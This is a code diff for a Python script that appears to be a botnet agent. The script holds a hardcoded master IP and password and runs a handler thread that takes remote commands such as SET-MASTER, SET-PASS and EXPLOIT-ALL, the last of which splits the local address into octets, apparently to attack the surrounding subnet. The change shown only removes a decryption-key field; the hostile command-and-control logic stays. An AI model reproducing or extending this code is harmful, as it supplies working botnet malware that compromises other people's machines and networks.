@@ -5,15 +5,13 @@ import os
 import subprocess
 
 MASTER = "10.80.100.20"
-DECRYPTION_KEY = "pass123"
 PASSWORD = "OkayNowYouCanUseMe"
 WEB = "www.ILoveRed.com"
 cmdQueue = Queue.Queue()
 
 class Handler(threading.Thread):
-    def __init__(self, master, key, passwd, web, q):
+    def __init__(self, master, passwd, web, q):
       	self.master = master
-	self.key = key
 	self.passwd = passwd
 	self.web = web
 	self.q = q
@@ -35,15 +33,12 @@ class Handler(threading.Thread):
 				builtin = raw.strip(self.passwd).split("----->")
 				if builtin[0] == "SET-MASTER":
 					self.master = builtin[1]
-				elif builtin[0] == "SET-KEY":
-					self.key = builtin[1]
 				elif builtin[0] == "SET-PASS":
 					self.passwd = builtin[1]
 				elif builtin[0] == "SET-WEB":
 					self.web = builtin[1]
 				elif builtin[0] == "RESET-EMERGENCY-OMG":
 					self.passwd = "DEFAULT-HARDCODED"
-					self.key = "DEFAULT-DENCRYPT"
 					self.web = "www.DEFAULT.com"
 				elif builtin[0] == "EXPLOIT-ALL":
 					octets = localhost.split(".")
@@ -67,7 +62,7 @@ def init():
 def main():
 	init()
 	listener = Listener(cmdQueue)
-    	handler = Handler(MASTER, DECRYPTION_KEY, PASSWORD, WEB, cmdQueue)
+    	handler = Handler(MASTER, PASSWORD, WEB, cmdQueue)
     	listener.start()
     	handler.start()
 main()
